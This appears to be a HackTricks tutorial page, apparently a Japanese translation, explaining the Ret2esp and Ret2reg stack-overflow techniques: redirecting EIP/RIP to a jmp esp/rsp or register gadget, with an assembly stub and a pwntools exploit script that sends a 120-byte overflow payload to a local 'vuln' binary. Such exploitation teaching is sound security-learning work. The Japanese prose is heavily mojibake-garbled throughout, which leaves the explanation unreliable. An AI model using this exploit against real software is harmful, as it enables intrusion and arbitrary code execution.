# Ret2esp / Ret2reg

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚’é€šã˜ã¦ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ã€‚
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## **Rest2esp**

**ESPï¼ˆã‚¹ã‚¿ãƒƒã‚¯ãƒã‚¤ãƒ³ã‚¿ï¼‰ã¯å¸¸ã«ã‚¹ã‚¿ãƒƒã‚¯ã®å…ˆé ­ã‚’æŒ‡ã™ãŸã‚**ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯EIPï¼ˆå‘½ä»¤ãƒã‚¤ãƒ³ã‚¿ï¼‰ã‚’**`jmp esp`**ã¾ãŸã¯**`call esp`**å‘½ä»¤ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ç½®ãæ›ãˆã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒä¸Šæ›¸ãã•ã‚ŒãŸEIPã®ç›´å¾Œã«é…ç½®ã•ã‚Œã¾ã™ã€‚`ret`å‘½ä»¤ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã¨ã€ESPã¯æ¬¡ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŒ‡ã—ã€ã¤ã¾ã‚Šã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã‚’æŒ‡ã—ã¾ã™ã€‚

Windowsã¾ãŸã¯Linuxã§**ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“é…ç½®ã®ãƒ©ãƒ³ãƒ€ãƒ åŒ–ï¼ˆASLRï¼‰**ãŒæœ‰åŠ¹ã§ãªã„å ´åˆã€å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§è¦‹ã¤ã‹ã‚‹`jmp esp`ã¾ãŸã¯`call esp`å‘½ä»¤ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ãŸã ã—ã€[**ASLR**](../common-binary-protections-and-bypasses/aslr/)ãŒæœ‰åŠ¹ãªå ´åˆã€ã“ã‚Œã‚‰ã®å‘½ä»¤ã‚’è„†å¼±ãªãƒ—ãƒ­ã‚°ãƒ©ãƒ å†…ã§æ¢ã™å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆã‹ã¤[**PIE**](../common-binary-protections-and-bypasses/pie/)ã‚’æ‰“ç ´ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã€‚

ã•ã‚‰ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’**EIPã®ç ´æå¾Œã«é…ç½®ã§ãã‚‹**ã“ã¨ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã®ä¸­å¤®ã§ã¯ãªãã€é–¢æ•°ã®ã‚¹ã‚¿ãƒƒã‚¯ã®ä¸­ã«é…ç½®ã•ã‚ŒãŸå ´åˆã«ç™ºç”Ÿã™ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹é–¢æ•°ã®æ“ä½œä¸­ã«å®Ÿè¡Œã•ã‚Œã‚‹`push`ã¾ãŸã¯`pop`å‘½ä»¤ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«å¹²æ¸‰ã—ãªã„ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚

### ã‚¹ãƒšãƒ¼ã‚¹ãŒä¸è¶³ã—ã¦ã„ã‚‹å ´åˆ

RIPã‚’ä¸Šæ›¸ãã—ãŸå¾Œã«æ›¸ãè¾¼ã‚€ã‚¹ãƒšãƒ¼ã‚¹ãŒä¸è¶³ã—ã¦ã„ã‚‹å ´åˆï¼ˆãŠãã‚‰ãæ•°ãƒã‚¤ãƒˆã—ã‹ãªã„å ´åˆï¼‰ã€æœ€åˆã®`jmp`ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãè¾¼ã‚“ã§ãã ã•ã„ã€‚
```armasm
sub rsp, 0x30
jmp rsp
```
### æ—©ã‚ã«ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ãã€‚

### ä¾‹

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ä¾‹ã¯ã€[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) ã«ã‚ã‚Šã€æœ€çµ‚çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
## Ret2reg

åŒæ§˜ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¿”ã™é–¢æ•°ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€**`call eax`**ã¾ãŸã¯**`jmp eax`**å‘½ä»¤ï¼ˆ**ret2eax**ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ï¼‰ã‚’æ´»ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹åˆ¥ã®æ–¹æ³•ãŒæä¾›ã•ã‚Œã¾ã™ã€‚eaxã¨åŒæ§˜ã«ã€èˆˆå‘³æ·±ã„ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å«ã‚€**ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆ**ret2reg**ï¼‰ã€‚

### ä¾‹

ã“ã“ã«ä¾‹ãŒã‚ã‚Šã¾ã™ï¼š[https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)

## ä¿è­·

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): ã‚¹ã‚¿ãƒƒã‚¯ãŒå®Ÿè¡Œä¸å¯ã§ã‚ã‚Œã°ã€ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’é…ç½®ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€ã“ã‚Œã¯å½¹ç«‹ã¡ã¾ã›ã‚“ã€‚
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): ã“ã‚Œã‚‰ã¯ã€espã‚„ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã«ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹å‘½ä»¤ã‚’è¦‹ã¤ã‘ã‚‹ã®ã‚’é›£ã—ãã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks**ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
